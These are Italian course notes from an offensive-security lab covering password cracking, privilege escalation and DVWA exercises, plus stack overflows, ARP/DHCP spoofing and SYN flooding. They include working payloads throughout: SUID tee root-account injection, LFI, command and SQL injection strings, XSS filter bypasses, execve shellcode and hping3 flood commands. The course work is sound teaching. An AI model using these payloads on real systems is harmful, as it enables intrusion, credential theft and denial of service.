@@ -1,0 +1,1479 @@
+Per attivare greenbone
+
+gvm-start
+https://127.0.0.1:9392/tasks
+
+cercare scans e poi tasks nella barra superiore
+
+
+Per visualizzare il proprio indirizzo --> ip a
+
+
+---------------------------------------LEZIONE 6/03/2024--------------------------------------------------------
+
+BRUTEFORCING E PRIVILEGE ESCLATION
+
+
+Dizionario --> elenco di parole note
+bruteforce
+
+Su kali sono disponibili wordlists,altre sono scaricabili dal web.
+Liste di username e passoword molto probabili
+
+Tramite le wordlist è possibile verificare se una password è resente in un documento
+less wordlist.txt, nel documento tramite /nome si può vedere se la parola è presente	
+grep sole nomefile mostra l'elenco delle occorrenze sul terminale 	
+
+Software interessanti sono cwel e cupp
+
+John the Ripper è il tool per il craking a forza bruta.
+
+Nella man page di john sono indicate tutti gli ordinin di configurazioni che john prova.
+
+Provano tutte le combinazioni possibili in input per cercare un match con l'hash in output.
+
+I numeri random non sarebbero generabili. Le sequenze di numeri sono pseudo-random che dopo una serie lunghissima si ripetono.
+
+John ha bisogno di un file con pass da craccare.
+
+sudo unshadow /etc/passwd /etc/shadow > kali.pwd
+
+/etc/shadow contiene i vari hash  
+
+
+Combina il contenuto dei 2 file
+john --single kali.pwd
+
+john -show kali.pwd --> mostra cosa ha trovato fino a quel momento, se rilanciato riparte dal punto di interruzzione
+
+john --wordlist:/usr/share/wordlists/john.lst kali.pwd --> si da a john una wordlist da verificare
+In alternativa john -wordlist:/usr/share/wordlists/john.lst kali.pwd
+
+John non è tarato per fare attacchi di forza bruta. John paradossalmente è configarato per cercare pass d aun certo numeor di caratteri in su
+quindi ad esempio se la password è di 3 caratteri john non la calcola anche se la ricerca delle password possibili ad esempio su una base di 64 caretteri diversi sarebbe molto vecole
+
+
+nano .john/john.ini 
+less /etc/john/john.conf --> per visualizzare la man page
+/incremental --> nel file e si ottegono le sezioni di configaurazione
+
+nano ~/.john/john.ini
+
+[Incremental:MIO]
+File = $JOHN/ascii.chr
+MinLen = 2
+MaxLen = 4
+CharCount = 95
+
+john -incremental:MIO kali.pwd --> (non penso sia richiesto)
+
+john --format=crypt kali.pwd --> non si vogliono usare i formati di john ma la funzione di crypt del SO, la quale è in grado di decriptare i propri hash essendo il file creato sulla stessa macchina
+
+
+Una volta trovato un account valido occorre prendere il controllo della macchina.
+
+sudo -l --> verifica se l'utente può usare sudo, il che sarebbe molto comodo per l'attaccante
+
+
+Nella macchina creiamo un nuovo user www con password 1234.
+Per farlo occorre essere root, quindi sudo -i
+Comando adduser www
+id www --> per controllare che l'utente sia stato creato
+
+Concediamo dei permessi al nuovo utente creato.
+
+Comando visudo per modficare i permiessi nel file /etc/sudoers
+aggiungere la riga di permesso
+www     ALL=(root) NOPASSWD: /usr/bin/vi /var/www/html/*
+
+sudo /usr/bin/vi /var/www/html/../../../etc/shadow
+I permessi concessi permettono all'utente di utilizzare il comando con qualsiasi prefisso /var/www/html, per sudo basta che la sintassi sia corretta
+
+L'utente potrebbe ora andare a modificare il file sudoers per modificare i suoi permessi
+sudo /usr/bin/vi /var/www/html/../../../etc/passwd --> si possono cambiare le proprie credenziali
+Si insiscono 0 0 nel gruppo e user dell'utente interessato, così al prossimo login l'utente potrà entrare come root
+
+find / -perm /6000
+Trova i file con permessi speciali
+
+find / -perm /6000 -ls 2>/dev/null , mostra solo tutti i file che hanno il set user id bit settato
+
+uno dei classici è il comando setuserid bit per il file di gestione della password
+
+
+Il comando tee ha un set user id bit settato, cerchiamo un modo per utilizzarlo in maniera mavevola.
+man tee --> legge da std input e scrive il risulato su std output
+
+si può ottenere la propria riga 
+grep guest /etc/passwd > guest.pwd
+nano guest.pwd
+
+hack:x:0:0:Be My Guest,,,:/root:/bin/bash
+cat guest.pwd | tee -a /etc/passwd
+Il comando tee è eseguibile da chiunque perchè ha il suid settato
+
+
+
+openssl passwd -1 -salt hack2 hack2 --> genera un hash
+
+sudo grep hack /etc/shadow --> hack:$y$j9T$EijhlMKzbqpt3zbuv5C/Z0$rZbk9sBMvN4yAlkYZGNeYo4DPdSI.3xkQjfW5pSeTi1:19788:0:99999:7:::
+la parte finale rappresenta poi l'hash da aggiungere nel file successivo
+
+
+nano hack2.s --> hack2:$1$hack2$lGnlSld/2c43AM6i0ISll0:19788:0:99999:7:::
+cat guest.pwd | tee -a /etc/passwd
+
+cat hack2.s | tee -a /etc/shadow
+
+Vedere i file sulla macchina vunerabile che hanno troppi permessi o permessi sbagliati.
+
+-----------------------------------------LEZIONE 13-03-2024--------------------------------------------------------------
+
+Ci sono molteplici vunerabilità nelle applicazioni web che si possono sfruttare.
+
+Request-forgery. 
+Il browser visitando un sito controllato da un attacant o cliccando su un email malevola, il sito dell'attaccante crei una form che viene visualizzata sul browser della vittima
+così che la vittima spedisca i dati al sito malevolo dopo essersi autenticato sul server originale.
+Si utilizza un cookie di autenticazione valido da parte dell'attaccante che lo ha ottenuto dalla vittima.
+
+Se l'attaccante riesce ad iniettare un indirizzo in modo che il server faccia una richiesta sbagliata, la risposta potrebbe includere risorse del server privato che non sarebbero direttamente accessibili.
+Ci possono poi essere problemi di serializzazione e deserializzazione.
+
+
+
+Esercitazione Web Security
+
+git clone https://github.com/eystsen/pentestlab.git. --> applicazione per testare applicazioni vunerabili. Già presente sulle macchine del lab.
+cd pentestlab
+
+/pentestlab.sh --list --> mostra i progetti disponibili
+
+ Dockerfiles from:
+  DVWA                   - Ryan Dewhurst (vulnerables/web-dvwa)
+  Mutillidae II          - OWASP Project (citizenstig/nowasp)
+  bWapp                  - Rory McCune (raesene/bwapp)
+  Webgoat(s)             - OWASP Project
+  Juice Shop             - OWASP Project (bkimminich/juice-shop)
+  Vulnerable Wordpress   - Custom made from github.com/wpscanteam/VulnerableWordpress
+  Security Ninjas        - OpenDNS Security Ninjas AppSec Training
+  Altoro Mutual          - Custom made from github.com/hclproducts/altoroj
+  Vulnerable GraphQL API - Carve Systems LLC (carvesystems/vulnerable-graphql-api)
+
+-----------------------------------------------------------
+./pentestlab.sh list  
+Available pentest applications
+  bwapp                 - bWAPP PHP/MySQL based from itsecgames.com
+  webgoat7              - OWASP WebGoat 7.1
+  webgoat8              - OWASP WebGoat 8.0
+  webgoat81             - OWASP WebGoat 8.1
+  dvwa                  - Damn Vulnerable Web Application
+  mutillidae            - OWASP Mutillidae II
+  juiceshop             - OWASP Juice Shop
+  vulnerablewordpress   - WPScan Vulnerable Wordpress
+  securityninjas        - OpenDNS Security Ninjas
+  altoro                - Altoro Mutual Vulnerable Bank
+  graphql               - Vulnerable GraphQL API
+
+
+Noi useremo dvwa
+
+./pentestlab.sh start dvwa --> lancia un applicazione / server web che 
+
+cercare http://dvwa nel browser --> disabilitare il proxy per 127.0.0.0/8
+credenziali admin/password
+
+
+Noi abbiamo parlato di enumeration relativi ad indirizzi e password.
+
+Un altro livello è scopirire cosa ci sia nel server web, una volta scoperto che sulla macchina è presente un server web.
+Per questo esiste un tool che va a caercare alcune possibili pagine valide --> gobuster.
+
+Utilzza una lista di nomi di pagine e directory più comuni per analizzare il sito.
+
+
+QUando vediamo una pagina di cerca di capire come sfrutarne le vulnerabilità.
+In ogni meccanismo di iterazione può essere presente un vettore di attacco.
+
+Si comincia con un bruteforce nel login.
+
+Magari nella form è presente codice che evita l'inserimento di alcuni caratteri.
+SI può pensare di creare a meno la richiesta http è abbasyanza scomodo, quindi utilizziamo il tool Burpsuite.
+
+è pensato per fare da proxy tra browser e server web.
+è possibile configurare il browser affinchè tutte le richieste vadano a Burp.
+
+Lo si può usare come proxy o semplicemente come client.
+
+Può essere utile per alimentare altri tool ad esempio come hydra. Così da sapere l'url da invocare ( burp ) e fare l'attacco con hydra.
+
+
+LOCAL FILE INCLUSION
+
+ci chiediamo se possiamo sostituire i file o cambiarne il contenuto.
+Il server utilizza http://127.8.0.1/vulnerabilities/fi/?page=file1.php per localizzare le pagine.
+Provando a sostituire 
+http://127.8.0.1/vulnerabilities/fi/?page=file4.php
+http://127.8.0.1/vulnerabilities/fi/?page=/etc/passwd
+http://127.8.0.1/vulnerabilities/fi/?page=/etc/shadow --> l'app non ha privilegi insufficienti per leggere il file
+http://127.8.0.1/vulnerabilities/fi/?page=/etc/hosts --> si vedono gli IP di tutte le macchine interne.
+
+REMOTE FILE INCLUSION
+
+è un modo di includere risorse non direttamente accessibili.
+Supponendo ci sia un server web da qualche parte in rete.
+
+Sulla macchina kali creimo un file test.php.
+<?php echo '<p>Hello World</p>'; ?>
+
+
+python3 -m http.server 8081 --> creiamo un server web a 192.168.56.6 ( il nostro ip vediante ip a)
+che rappresenta l'ipotetico server web.
+
+La macchina dwva ha accesso al server web ed è vunerabile e accessibile da noi.
+http://127.8.0.1/vulnerabilities/fi/?page=http://192.168.56.5:8081/test.php 
+Fallisce perchè la contrumusura funziona.
+
+COMMAND INJECTION
+
+Inserire un ip a caso e catturare lòa richiesta con Burp e inviarla al repeater
+modifcare l'ultima riga con
+ip=8.8.8.8;cat+/etc/passwd&Submit=Submit
+
+
+la stringa cat /etc/passwd decode as url encode url --> %38%2e%38%2e%38%2e%38%3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64
+
+
+ip=||cat+/etc/passwd ... --> essendo una pipe se fallisce il primo comando viene eseguito il secondo ( il primo fallisce sempre perchè manca il parametro)
+
+-----SQL INJECTION-------
+Nella sezione sql injection andare su view source per vedere come lavora la query
+inserire allora --> ' OR '1'='1
+si vedono tutti gli utenti
+
+
+UNION BASED QUERY --> si possono iniettare query più complesse per ottenere più dati.
+Tramite UNOIN a patto che il numero di colonne sia uguale e che i tipi combacino.
+
+union select NULL --> segna il posta di una colonna --> se errore niente
+union select NULL --> SE SUCCESSO  LA QUERY HA 2 COLONNE
+'UNION SELECT NULL;#
+
+Proviamo quindi ad enumerare il DB
+union select NULL,@@version# --> versione del DB , magari nelle CVE ci sono vunerbilità.
+ID: 'UNION SELECT NULL, @@version;#
+First name: 
+Surname: 10.1.26-MariaDB-0+deb9u1 --> bingo.
+
+IL db contiene tabelle che hanno info sulle tabelle (dizionari).
+'UNION SELECT NULL,database();#
+First name: 
+Surname: dvwa --> bbomm
+
+‘ union select null,schema_name from
+information_schema.schemata #
+ID: ' union select null,schema_name from information_schema.schemata #
+First name: 
+Surname: dvwa
+ID: ' union select null,schema_name from information_schema.schemata #
+First name: 
+Surname: information_schema --> contiene tutte le info strutturali della macchina
+
+
+union select null,table_name from information_schema.tables #
+si ottengono tutti i nomi delle tabelle.
+Magari leggendo la documentazione della versione del db si possono scoprire varie cose.
+
+' union select user,password from users #
+
+
+CROSS SITE SCRIPTING REFLECTED
+
+<script >alert("hacked")</script>
+
+
+-----------------------------------------------------------LEZIONE 27/03/2024-----------------------------------------------------------------
+
+Le tecniche che vedremo sono molto dipendenti dall'architettura, i veri indirizzi possono cambiare ( molto probabilmente ).
+
+Dato un binario vunerabile vediamo come dirottarne l'esecuzione, di solito lo si fa leggendo/scrivendo in memoria o far saltare fuori una shell.
+Fin ora abbiamo sfruttato vunerabilità nella configurazione degli script.
+
+sudo apt-get install gcc-multilib
+
+sudo -i
+echo 0 > /proc/sys/kernel/randomize_va_space
+
+Registri x86 : 
+AX,BX,CX,DX
+IP ( istruction pointer )
+stack pointer ( ultimo valore allocato sullo stack, non il primo libero ).
+La prima cella libera è quella più in basso
+BP ( base pointer ) : contiene l'indirizzo del frame.
+
+
+
+Utilizziamo le librerie di C che non fanno controlli sui buond dei buffer
+Debugger GDB : strumento per ispezionare il codice durante l'esecuzione e vedere lo stato della memoria
+
+
+Primo es: (kali㉿kali)-[~/Desktop/lab_exercises/write_var
+
+objectdump -D es --> es è l'eseguibile
+Vediamo ora il codice disassemblato
+13e1:       50                      push   %eax
+13e2:       e8 e2 fd ff ff          call   11c9 <vuln>
+
+Osservare il codice da 000011c9 <vuln>:
+epx deve essere salvato dal chiamato per poi essere ripristinato alla fine della chiamata
+Cosa succede alla memoria?
+Il registro ESP decide dove inizia lo stack 
+Lo stack di una funzione è compreso tra EPB e ESP
+
+EBP : old EPB
+EPB-0x4 : ESI
+EBPP-0x8 : EBX
+EPB-0xC
+EPB-0x10 : var control
+
+EBP-0x78 : var buf --> 120 in decimale
+EPB-0xc8
+EPB-0xd0 : src
+EPB-0xd4 : buf
+
+
+
+cd /etc/apt/sources.list
+sostituire https:kali ... con kali.download
+apt update
+sudo apt install gdb
+objdump -D --disassembler-options="intel " es  | less
+gdb es
+set disassembly-flavor intel
+disas vuln
+inserire breakpoint all'indirizzo 0x565561f0 con b * 0x565561f0. (l'indirizzo strcpy)
+run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Il carattere A è rappresentato in memoria con 0X41, quindi quando in memoria troveremo una serie di 0X41 avremo trovato il buffer.
+python3 ord("A) --> 65
+python3 hex(65) --> 0x41
+
+Comandi utili gdb
+print
+x/n 
+
+x/150xw $esp --> guardiamo le prime 150 parole sullo stack
+chiamiamo ni (next instruction ) per eseguire la strcpy ( il breakpoint si è fermato su questa istruzione ma non l'ha eseguita ) 
+x/10xw $ebp-0x78 --> notiamo tutti i valori esadecimali 0x41
+
+run $(python3 -c 'print("A"*104 + "BBBB")')
+NB : il buffer è stato dichiarato di 100, noi abbiamo inserito 104.
+ni
+x/10xw $ebp-0x10 --> vediamo che nel primo campo è presente 0x42424242 ovvero le BBBB inserite
+
+Vogliamo ora inserire nella variabile control il valore BCDE
+
+Le macchine sono little-endian quindi procediamo ad inserire
+run $(python3 -c 'print("A"*104 + "EDCB")')
+cont --> continue
+e otteniamo SEC{thisistherightflagidiot!}
+
+Esercizio 2
+run per posizionare correttamente la memoria
+
+inseriamo un breakpoint a main --> break main
+
+MAIN
+
+ecx (&argc) = STACK + 0x4 --> ovvero ESP + 0x4
+edx = ecx
+---confronto-----
+?? argc minore uguale 1? --> salta a riga 34
+edx (argv) += *(edx + 0x4)
+edx+=0x4 (argv +4 ) 
+edx [argv[1]]= *edx
+
+
+---- main ------
+src : argv[1] 
+dst : [ebp-0x1c]
+
+
+call funzione : call eax
+ebp-0xc 
+
+run $(perl -e 'print "A"x16') --> tra il buffer e la funzione chiamata ci sono 16 byte
+
+
+
+ESERCIZIO 3
+(gdb) run $(perl -e 'print "A"x112', "BBBB")
+
+run $(perl -e 'print "\x90"x66,"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\
+x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\
+xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68","\x80\xd6\xff\xff"')
+È un comando fornito da loro caduto dal cielo che invoca la funzione malevola
+
+
+
+
+
+
+
+
+-------------------------------------------------------------------LEZIONE 3/04/2024------------------------------------------------------------------
+
+
+-------------------------LEZIONE 03/04/2024--------------------------------
+
+Differenza tra ricerca su google e l'accesso ad un sito tramite URL.
+
+echo 0 > /proc/sys/kernel/randomize_va_space
+
+I primi 2 es fatti l'ultima lezione hanno riguardato : 
+Sovrascrivere il contenuto di una variabile
+Sovrascrivere un puntatore a funzione per saltare in un punto arbitrario del codice.
+
+Se non è presente una funzione si utilizza uno shellcoding, ovvero iniettare codice eseguibile.
+Il codice e i dati sono entrambi in memoria.
+
+Ricostruiamo gli indirizzi.
+
+Partiamo dal main, disass main
+0x565f920a <+40>:    push   %eax --> sullo stack viene caricato eax.
+La funzione vuln carica un solo parametro.
+LO stack cresce verso il basso
+
+EBP+0X8	ARG 0 ( src)
+	-------------------
+EBP+0x4	RETURN ADDR
+	--------------------
+ESP : 	OLD EPB --> l'esp punta alla cima dello stack. L'ESP punta all'ultimo valore pushato
+	--------------------------
+ESP-0X4:	OLD EBX
+	-----------------------
+	.....
+	--------------------------
+EBP-0x6c:	buf
+	--------------------------
+ESP-0X80  
+	--------------------------
+ESP-0X84: *src
+	---------------------------
+ESP-0X88: buf
+
+
+
+Costruiamo una NOP 
+
+Vogliamo sapere il valore di EPB prima della strcpy.
+Inseriamo quindi un breakpoint con b* indirizzo della strcpy.
+b* 0x565561c5
+ni
+
+run $(perl -e 'print "\x90"x66, "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68", "\xfc\xcd\xff\xff"')
+
+p $ebp-0x6c --> all'interno della nostra funzione è il buffer, lo abbiamo calcolato guardando il disassemblato e facendo una mappa della memoria.
+x/10xw $esp
+
+Quando il payload è stato lanciato.
+Il processore ha eseguito un istraiuzoine che non esiste in x86
+A questo punto il processore è saltato ad eseguire in un punto a caso. Ad un indirizzo che non è il nostro shellcode.
+
+L'istruzione leave prende il vecchio base pointer ( quello che è sullo stack ) e lo sostituisce con quello nuovo.
+Comando display/i $eip --> mostra l'istruzione corrente.
+
+L'indirizzo di ritorno non combacia con quello calcolato.
+0xffffcdfc:  \xfc\xcd\xff\xff
+
+
+Alla fine viene eseguito un programma /usr/bin/dash
+Viene eseguita alla fine una shell ( occorre non inserire breakpoint ) 
+Occorre uscire da gdp per avere una shell di root. --> questo non è possibile direttamente da gdb
+Al di fuori di gdp l'istruzione fallisce.
+
+Lo stack dentro gdp è diverso da quello reale, un motivo è che le variabili di ambiente caricate prima di eseguire il programma sono diverse
+
+
+Attraverso un segnale SIGSTOP --> 19,  
+./es "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & kill -STOP $! --> è necessario che la stringa di AAA sia abbastanza lunga per dare il tempo necessario al processo di "crearsi" così che gdb possa attarcisi
+
+gdb --pid=65293 --> ci leghiamo ad un processo già in esecuzione ( sospeso ) 
+kill -CONT 65293 --> in un terminale a parte facciamo finire il processo
+
+Il processo si blocca quando si sta ancora creando.
+Con il comando finish si fa avanzare il processo fino alla return.
+A forza di finish si entra nella modalità 32 bit.
+Il debugger sostituisce la prossima istruzione con un interrupt.
+Ad un certo punto finisce lo stack a 64bit e inizia quello a 32 bit.
+
+Il comando backtrace mostra dove ci si trova nel programma.
+
+
+
+
+-----------------------------------------LEZIONE 10/04/2024---------------------------------------------------
+
+XSS : vunerbilità client side
+
+Differenza vulnerabilità client side o server side? Sostanzialmente si esegue l'attacco sul server o sul client
+In una server side si può andare ad agire su un DB. 
+Il client 
+
+Ha molto più impatto una vunerabilità server side dato che la quantità di vittime può essere molto più grande.
+
+Si può avere lo stesso impatto , Ovvero cosa posso fare.? ( non in termini di numero di vittime ) 
+Le vunerabilità client sono confinate a tutto ciò che può fare il browser. ( che comunque non è poco : si potrebbe cercare
+ad esempio di dirottare il comportamento di alcuni dispositivo I/O) 
+
+A livello client side si cerca di fare eseguire del codice javascript.
+JS ha la capacità di scrivere cose anche molto complesse, il che è una vunerabilità.
+
+
+
+Osservando il comportamento del sito tutti i parametri sono presi da URL e visualizzati sul sito.
+Cosa si fa per capire se l'url che mostra il render sia una vunerabilità.
+Cerchiamo di capire se possiamo scrivere del codice nel campo del parametro.
+
+Vediamo se il sito interpreta HTML.
+es ?nome=<h1>ciao</h1>
+Molto probabilmente se riesce ad interpretare HTML potrebbe interpretare il tag <script> in cui inseriremo del codice JS.
+<script>alert("hacked")</script>
+Viene mostrato effettivamente un JS. --> c'è una cattiva interpretazione/parsing dei parametri.
+Quindi siamo in presenza di una vulnerabilità
+Come possiamo sfruttare questa vulnerabilità? 
+Username e password?? DIfficile visto che sono in memoria
+
+I cookie invece possono essere letti. --> this.cookies
+Poi possiamo inviarli, la domanda ora è come.
+Possiamo utilizzare un web hook o reverse proxy, non possiamo fare ssh.
+Facciamo alcune richieste HTTP ad un indirizzo malevolo.
+Web hooks : permette di visualizzare le richieste.
+Tramite un web hook quindi inviamo i cookie ad un indirizzo malevolo.
+L'ultima fase dell'attacco è non rendere l'attacco visibile, quindi cammuffarlo.
+Thin-url, oppure l'attaccante prende un dominio.
+
+
+
+Livello 2.
+
+
+Black box, cerchiamo di capire dall'esterno come funziona il sistema.
+
+Possiamo osservare come il filtro del sito esegue il parsing dell'url.
+Notiamo che non possiamo eseguire il tag script.
+
+Proviamo a pensare come bypassare il filtro.
+Innestiamo uno script dentro uno script per vedere se il tag interno rimane e maari viene eseguito
+name=<scr<script>ipt>alert("hacked");</scr</script>ipt>
+
+
+Livello 3.
+Il filtro è progettato nel seguente modo
+$name =  $_GET["name"];
+$name = preg_replace("/<script>/i","", $name);
+$name = preg_replace("/<\/script>/i","", $name);
+
+è presente una i, il cui rende il tutto case insensitive.
+Questo ci permette comunque si eseguire l'attacco di prima.
+name=<scr<script>ipt>alert("hacked");</scr</script>ipt>
+
+
+Il livello 4 ha al suo interno un istruzione che esamina prima di tutto il parametro inserito.
+è presente il tag preg match. Una volta valutato tutto l'url guarda se si rimane con la parola script
+
+if (preg_match('/script/i', $_GET["name"])) {
+  die("error");
+}
+
+Adesso non è più possibile inserire il comando precedente dato che l'istruzione rimarrebbero i tag script dopo l'elaborazione.
+Possiamo utilizzare quindi altri tag? Certo, ne abbiamo tanti.
+
+<img src=x,"/onerror=alert(1)> ???
+
+
+
+Livello 5.
+
+Come capire cosa il filtro sta facendo?
+Ad esempio il comando console.log funziona mentre il comando alert no.
+
+<script>alert("hacked")</script>
+<script>console.log("hacked")</script>
+
+Potrebbe essere bloccata la funzione alert.
+
+Proviamo a cercare alcune alternative all'alert, ad esempio print,prompt.
+
+Se avessimo il controllo totale del browser potremmo fare comunque roba interessante.
+1. Ridirezione di richieste su altri siti.
+2. Si possono attivare alcuni dispositivi come la telecamera del dispositivo.
+
+Questa macchina virtuale ha molti esercizi simili a quelli dell'esame.
+Lo scopo è sempre quelle di bypassare il filtro.
+
+
+
+Passiamo adesso alla parte di software security.
+
+L'esercizio si aspetta che scriviamo il valore di una variabile.
+Un input occupa memoria nello stack.
+Inondando lo stack di caratteri fino a raggiungere le parti della memoria contenenti dati.
+
+Nell' esercizio dopo alcune prove inseriamo il comando
+./es $(perl -e 'print "A"x500') --> scriviamo 500 caratteri "A" nella variabile di controllo
+Dobbiamo capire quante A dobbiamo inviare.
+
+Occorrono 104 byte per coprire la memoria fino al control. Dal 105 esimo in poi si scrive nella variabile var.
+Questo lo otteniamo per prove vedendo l'output del programma ./es $(perl -e 'print "A"x104, "EDCB"')
+
+Possiamo inserire l'indirizzo di ritorno per chiamare una funzione nascosta.
+Cerchiamo intanto di generare un segmentation fault.
+Con 16 A il programma crasha.
+
+Utilizziamo un debugger gdb
+
+
+
+------------------------------------LEZIONE 17/04/2023-------------------------------
+pp. comandi per l'esercitazione di offensive security. Seguire le istruzioni per creare una rete.
+
+Useremo un'architettura basata su container, simulando un intero sistema operativo senza avviare altre macchine
+virtuali.
+Viene fornita un' immagine di una serie di pacchetti software che simula una macchina virtule.
+I pacchetti sono un Docker, un modo comodo per realizzare layout di testing.
+
+Docker crea dispositivi virtuali per lo smistamento del traffico di rete.
+Il bridge di rete di docker permette direttamente di intercettare i pacchetti consentendo il monitoraggio di rete.
+
+Il docker compose yml attiva determinati servizi all'interno di vari container, è sostanzialmente un file di configurazione.
+Il file infra, estrae il pacchetto con l'immagine del SO e lo carica nelle immagini disponibili del docker.
+
+
+Occorre controllare di avere /etc/apt/sources.list --> deb http://kali.download/kali kali-rolling main contrib non-free non-free-firmware.
+TUtte le info di configurazione sono nella pagina di virtuale di guida all'installazione.
+
+
+Tramite wireshark possiamo accedere al bridge.
+Facendo ip a è comparsa una nuova interfaccia di rete --> br-208310f5bc47
+wireshark mostra una scelta tra varie interfacce che conosce, scegliere la br-...... per ascoltare il traffico su questa interfaccia di rete.
+
+
+ip a mostra le informazione relative all'indirizzo ip (10.9.0.5/24) --> il caso della macchina A
+arp -n mostra la tabella arp del dispositivo. Al momento è vuota perchè non è stata interrogata alcuna macchina-
+
+facendo un ping tra disposivi --> ping ip destinazione ( 10.9.0.6)
+ping 10.9.0.6
+PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
+64 bytes from 10.9.0.6: icmp_seq=1 ttl=64 time=0.277 ms
+64 bytes from 10.9.0.6: icmp_seq=2 ttl=64 time=0.148 ms
+
+con arp -n ora notiamo che è presente l'endpoint a cui ci si è rivolti.
+Più nello specifico A ha memoria del ping che ha fatto su B
+Address                  HWtype  HWaddress           Flags Mask            Iface
+10.9.0.6                 ether   02:42:0a:09:00:06   C                     eth0
+
+Ma anche B conosce il mac di B , infatti è presente una riga anche su B
+Address                  HWtype  HWaddress           Flags Mask            Iface
+10.9.0.5                 ether   02:42:0a:09:00:05   C                     eth0
+
+Notiamo che wireshark ha intercettato l'arp request e l'arp reply che dovrebbero essere rispettivamente la prima e la seconda riga nell'interfaccia wireshark.
+Quando A pinga B, il kernel occorre sapere il mac address quindi fa un arp per scoprirlo.
+B risponde subito dopo. ( Ricordiamo che alla fine anche B conosce il mac di A, notare a questo proposito il traffico alla fine della comunicazione ).
+
+Ripetendo il ping non compaiono gli arp, questo perchè i dispositivi conoscono già i mac address che sono presenti nell arp table.
+Si può eliminare l'entry nella arp table con arp -d host
+
+
+Il terzo host C funge la man in the middle ( MITM ).
+APR SPOOFING. Tecniche sfruttate dal MITM, interponendoci tra le comunicazioni ed inoltrarlo modificandone eventualmente il contenuto.
+
+Comando ettercap, utile per offensive security in ambito man in the middle.
+
+
+ettercap -T -M arp 
+-T usare l'interfaccia testuale
+-M tipo man in the middle
+
+sul terminale C ( man in the middle ) 
+ettercap -T -M arp /10.9.0.6// /10.9.0.5// --> ettercap scopre i veri MAC e li sostituisce con i propri.
+
+Tornando su A e facendo arp -n, notiamo diversi IP con lo stesso mac address ( quello dell'attaccante ) 
+Dal terminale A facciamo telnet 10.9.0.6 ( macchina B  ) ma in realtà il mac è quella dell'attaccante.
+
+Vediamo che su wireshark passano pacchetti il cui mac di destinazione è quello dell'host C.
+
+
+Possiamo provare a fare un attacco più silenzioso
+
+tramite tcpdump -o si possono scrivere tutti i pacchetti intercettati in un file pk e scrtti in formato binario. 
+SI possono poi rileggere i campi intercettati sempre con tcpdump o wireshark.
+
+Spesso viene assegnato un pk.
+Occorre analizzato un tracciato sul quale è necessario capire se è in corso un attacco.
+Esempio si vedono tanti pacchetti che fanno tutti la stessa richiesta con username e password diversi ( sarà unbruteforcing delle credenziali ) 
+Wireshark aiuta tramite l'interfaccia.
+
+DHCP SPOOFING.
+Consiste nel dare la risposta prima del server leggittimo.
+In questo modo si fa impostare il server malevolo come gateway sulla vittima.
+
+DHCP è un protoccollo a 4 passaggi
+Scoprire il server -> dhcp discover
+Il server risponde --> dhcp offer
+IL client è contenuto dell offera --> dhcp request
+Il server registra --> dhcp ack
+
+Rimuoviamo prima l'IP sulla macchina B.
+addr del 10.9.0.6/24 dev eth0
+Facendo ip a notiamo che la macchina non ha alcun IP associato
+
+SUl terminale dell'attaccante lanciamo
+ettercap -T -M dhcp:10.9.0.20-60/255.255.255.0/8.8.8.8
+questa volta il tipo di attacco è sul dhcp
+
+Andiamo su B e configuriamo la rete per B
+dhclient eth0
+Facendo ip a notiamo che la macchina ha l'indirizzo 10.9.0.20 ( il che sono stati inviati da ettercap ) 
+
+SU wireshark notiamo che ci sono 4 pacchetti ( i 4 passi del protocollo ) , DISCOVER OFFER REQUEST ACK
+
+Dalla macchina B provando a fare un collegamento ad un endopoint esterno, tutti i pacchetti avranno come mac
+di destinazione quello della macchina malevola.
+
+
+SYN FLOODING
+
+è un attacco che vuole esaurire il numero di socket che il SO può aprire.
+Il protocollo TCP ha il concetto di timeout.
+SI manda il primo pacchetto di 3 way handshake e poi si considera il tutto fatto senza voler aprire una connessione. Questo per non esaurire le risorse sulla macchina attaccante. SUlla vittima viene mappata una regola in attesa di finalizzazione di connessione che rimane fino a timeout. Intanto si continua a mandare SYN dalla macchina attaccante. 
+
+Per nascondere la propria identità di può falsificare il proprio indirizzo IP.
+Utilizzeremo il tool hping3 ( sull'attaccante ) e un altra iperf per misurare le prestazione dei servizi delle vittime.
+
+SUl terminale B.
+ipef -s -> lancia un server in ascolto 
+sUL terminale A 
+iperf -c
+[ ID] Interval       Transfer     Bandwidth
+[  3]  0.0-10.0 sec  54.8 GBytes  47.1 Gbits/sec
+Notiamo che abbiamo trasferito tot byte ad una certa velocità
+
+aNdiamo sulla macchina malevola
+hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source 10.9.0.6
+
+Facendo iperf sulla macchina client non malevola notiamo che questa volta le prestazioni sono calate per via dell'attacco in corso.
+
+
+
+
+CORREZIONE ESERCIZI 
+prilege escalation find.
+è possibile eseguire il comando exec passando come parametro il nome del file, essendo che find gira come root ( dato che ha SUID ) c'è la possibilità che possa
+essere eseguito qualcosa di non bello.
+
+
+COme possono essere usate le acl per privilege escalation?
+Possono dare privilegi troppo allargati 
+
+Occorre fare attenzione perchè le modifiche sui permessi su un file.
+
+
+Le capabilities 
+CAP_FOWNER --> dice al SO di ignorare la coerenza tra processo manipolatore e processo manipolato.
+CAP_DAC_OVERRIDE --> ignora completamente i permessi
+
+Non ci sarà OSINT all'esame
+dnsmap ulis.se
+dnsrecop -d ulis.se
+
+
+-------------------------------LEZIONE 24/04/2024 -------------------------------------------
+
+Chiavi crittografiche.
+Le chiavi pubbliche possono essere usate per riservatezza,autenticità e integrità.
+Possiamo rendere pubblica una delle 2 chiavi ( chiave pubblica ), firmare messaggi con la chiave privata.
+La chiave pubblica deve essere autenticata, pre questo possiamo utilizzare il modello web of trust dove
+la chiave è testimoniata da altri utenti e la fiducia è sviluppata in modo decentralizzato, il problema è che 
+scala poco.
+
